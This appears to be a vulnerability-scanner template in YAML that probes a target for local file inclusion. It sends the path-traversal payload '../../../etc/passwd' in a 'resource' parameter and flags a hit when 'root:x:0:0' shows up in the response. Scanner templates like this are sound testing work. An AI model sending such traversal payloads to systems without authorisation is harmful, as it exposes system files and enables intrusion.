id: lfi7-362
name: 'Deep traversal in resource'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via resource'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      resource:
        - '../../../etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
